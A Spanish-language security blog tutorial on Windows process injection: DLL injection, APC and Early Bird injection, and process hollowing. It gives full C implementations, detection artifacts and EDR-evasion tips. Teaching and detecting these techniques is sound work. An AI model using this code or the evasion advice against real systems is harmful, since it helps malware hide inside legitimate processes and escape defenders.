---
layout: single
title: "Process Injection en Windows: DLL Injection, APC Injection y Process Hollowing"
date: 2026-06-22
categories: [malware, tutoriales]
tags: [process-injection, windows, malware, dll-injection, process-hollowing, apc, evasion, offensive]
excerpt: "Tres técnicas fundamentales de inyección de código en Windows: cómo funcionan a nivel de API y memoria, cuándo usarlas y qué dejan en el sistema."
permalink: /malware/process-injection-windows/
---

La inyección de código en procesos ajenos es una de las primitivas más usadas en malware y herramientas ofensivas. No porque sea sofisticada, sino porque es efectiva: te permite ejecutar código bajo el contexto de otro proceso, heredar sus tokens, esquivar controles de integridad y desaparecer del árbol de procesos del atacante.

Este post cubre tres técnicas clásicas — DLL injection via `CreateRemoteThread`, APC injection y Process Hollowing — desde el nivel de API hasta lo que realmente ocurre en memoria.

---

## 1. DLL Injection via CreateRemoteThread

La técnica más conocida. La idea es simple: escribir la ruta de una DLL en el espacio de memoria del proceso objetivo y forzarle a llamar a `LoadLibrary` sobre ella.

### Flujo

1. Obtener un handle al proceso objetivo con `OpenProcess`
2. Reservar memoria remota con `VirtualAllocEx`
3. Escribir la ruta de la DLL con `WriteProcessMemory`
4. Crear un hilo remoto apuntando a `LoadLibraryA`/`LoadLibraryW` con `CreateRemoteThread`

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD get_pid_by_name(const char *proc_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, proc_name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int inject_dll(DWORD pid, const char *dll_path) {
    SIZE_T path_len = strlen(dll_path) + 1;

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid
    );
    if (!hProc) return -1;

    LPVOID remote_buf = VirtualAllocEx(hProc, NULL, path_len,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    WriteProcessMemory(hProc, remote_buf, dll_path, path_len, NULL);

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE load_lib =
        (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        load_lib, remote_buf,
                                        0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProc, remote_buf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

### Detección

| Artefacto | Herramienta |
|---|---|
| Módulo DLL extraño en el proceso | Process Hacker → módulos cargados |
| `CreateRemoteThread` + `WriteProcessMemory` | ETW / Sysmon Event ID 8 |
| Ruta de DLL en memoria del proceso | Volatility `dlllist` / `malfind` |

El problema de esta técnica para el atacante: la DLL queda registrada en el PEB del proceso objetivo. Cualquier herramienta que enumere módulos la verá.

---

## 2. APC Injection

Las APCs (Asynchronous Procedure Calls) son rutinas que se ejecutan en el contexto de un hilo específico antes de que vuelva al modo de espera. Windows las usa internamente para I/O y timers. El atacante puede encolarlas con `QueueUserAPC`.

Para que una APC se ejecute, el hilo destino debe estar en estado **alertable** — es decir, bloqueado en `SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx` u otras llamadas con el flag `bAlertable = TRUE`.

### Flujo

1. Inyectar el shellcode en el proceso objetivo con `VirtualAllocEx` + `WriteProcessMemory`
2. Enumerar los hilos del proceso
3. Encolar una APC en cada hilo apuntando al shellcode con `QueueUserAPC`
4. Cuando algún hilo entre en estado alertable, el shellcode se ejecuta

```c
#include <windows.h>
#include <tlhelp32.h>

// shellcode de ejemplo (NOP sled + breakpoint para testing)
unsigned char sc[] = { 0x90, 0x90, 0x90, 0xCC };

int apc_inject(DWORD pid) {
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid
    );

    LPVOID remote_buf = VirtualAllocEx(hProc, NULL, sizeof(sc),
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remote_buf, sc, sizeof(sc), NULL);

    // Enumerar hilos del proceso
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT,
                                            FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)remote_buf, hThread, 0);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    CloseHandle(hProc);
    return 0;
}
```

### Early Bird APC

Una variante más limpia: crear el proceso suspendido con `CREATE_SUSPENDED`, inyectar el shellcode, encolar la APC en el hilo principal, y luego llamar a `ResumeThread`. El shellcode se ejecuta antes de que el proceso llegue al entry point — antes de que ningún EDR haya podido hookear el proceso.

```c
STARTUPINFOA si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi;

CreateProcessA("C:\\Windows\\System32\\notepad.exe",
               NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// ... VirtualAllocEx + WriteProcessMemory en pi.hProcess ...

QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);
ResumeThread(pi.hThread);
```

---

## 3. Process Hollowing

También llamado *RunPE*. En lugar de inyectar en un proceso existente, se crea un proceso legítimo suspendido (por ejemplo `svchost.exe`), se vacía su imagen de memoria y se reemplaza con el ejecutable malicioso.

Desde fuera, el proceso muestra el nombre y la ruta del binario legítimo. Internamente ejecuta código completamente diferente.

### Flujo

1. Crear el proceso objetivo suspendido con `CREATE_SUSPENDED`
2. Obtener el PEB del proceso remoto via `NtQueryInformationProcess`
3. Leer la `ImageBaseAddress` del PEB
4. Descargar la imagen original con `NtUnmapViewOfSection`
5. Allocar nueva memoria en la misma base (o dejar que el loader rebase)
6. Escribir las cabeceras y secciones del PE malicioso
7. Actualizar `ImageBaseAddress` en el PEB remoto
8. Fijar el registro `RCX`/`EAX` del hilo suspendido al nuevo entry point
9. `ResumeThread`

```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

// Asume que 'payload' es un buffer con un PE válido
void hollow(const char *target_path, BYTE *payload, SIZE_T payload_size) {
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi;

    CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Leer PEB del proceso remoto
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                              &pbi, sizeof(pbi), NULL);

    PVOID peb_base = pbi.PebBaseAddress;
    PVOID image_base_addr_ptr = (PVOID)((ULONG_PTR)peb_base + 0x10);

    PVOID remote_image_base;
    ReadProcessMemory(pi.hProcess, image_base_addr_ptr,
                      &remote_image_base, sizeof(PVOID), NULL);

    // Descargar imagen original
    pNtUnmapViewOfSection NtUnmap =
        (pNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, remote_image_base);

    // Parsear el PE malicioso
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);

    PVOID new_base = VirtualAllocEx(pi.hProcess,
                                    (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                                    nt->OptionalHeader.SizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);

    // Escribir cabeceras
    WriteProcessMemory(pi.hProcess, new_base, payload,
                       nt->OptionalHeader.SizeOfHeaders, NULL);

    // Escribir secciones
    PIMAGE_SECTION_HEADER section =
        IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        WriteProcessMemory(pi.hProcess,
                           (PVOID)((ULONG_PTR)new_base + section->VirtualAddress),
                           payload + section->PointerToRawData,
                           section->SizeOfRawData, NULL);
    }

    // Actualizar ImageBase en el PEB
    WriteProcessMemory(pi.hProcess, image_base_addr_ptr,
                       &new_base, sizeof(PVOID), NULL);

    // Fijar entry point en el contexto del hilo
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
#ifdef _WIN64
    ctx.Rcx = (DWORD64)new_base + nt->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eax = (DWORD)new_base + nt->OptionalHeader.AddressOfEntryPoint;
#endif
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

### Detección de Process Hollowing

Los EDRs modernos buscan discrepancias entre la imagen en disco y la imagen en memoria. Herramientas como PE-sieve o Moneta las detectan comparando el hash de cada sección del PE cargado contra el binario original en el filesystem.

```
pe-sieve.exe /pid 1234 /report 1
```

Si las secciones `.text` o `.data` difieren de lo esperado, hay hollowing o algún tipo de patching en memoria.

---

## Comparativa

| Técnica | Visibilidad en PEB | Requiere DLL en disco | Estado alertable necesario | Dificultad |
|---|---|---|---|---|
| DLL Injection | Alta (DLL listada) | Sí | No | Baja |
| APC Injection | Baja (shellcode) | No | Sí (o Early Bird) | Media |
| Process Hollowing | Ninguna (imagen reemplazada) | No | No | Alta |

---

## Consideraciones operacionales

**VirtualAllocEx con PAGE_EXECUTE_READWRITE** es una señal inmediata para cualquier EDR decente. En producción se usa un esquema de dos pasos: primero `PAGE_READWRITE` para escribir, luego `VirtualProtectEx` a `PAGE_EXECUTE_READ` antes de ejecutar.

**NtUnmapViewOfSection** desde `ntdll.dll` es una syscall monitorizada. Un EDR con hooks de userland la verá aunque no uses la API de Win32. Para esquivar esto se combinan estas técnicas con direct syscalls (Hell's Gate / Halo's Gate), que están cubiertas en posts anteriores de este blog.

**Los handles necesarios** (`PROCESS_ALL_ACCESS`) son ruidosos. Sysmon Event ID 10 (ProcessAccess) registra cada `OpenProcess` con los access rights solicitados. Un EDR correlacionando `OpenProcess` + `WriteProcessMemory` + `CreateRemoteThread` sobre el mismo PID en menos de un segundo lo clasifica como inyección con alta confianza.

---

## Referencias

- [Process Injection — MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/)
- Sektor7 — Malware Development Intermediate Course
- [PE-sieve — hasherezade](https://github.com/hasherezade/pe-sieve)
- [Moneta — Forrest Orr](https://github.com/forrest-orr/moneta)
- Windows Internals, 7th ed. — Russinovich et al., cap. 3 (Processes)
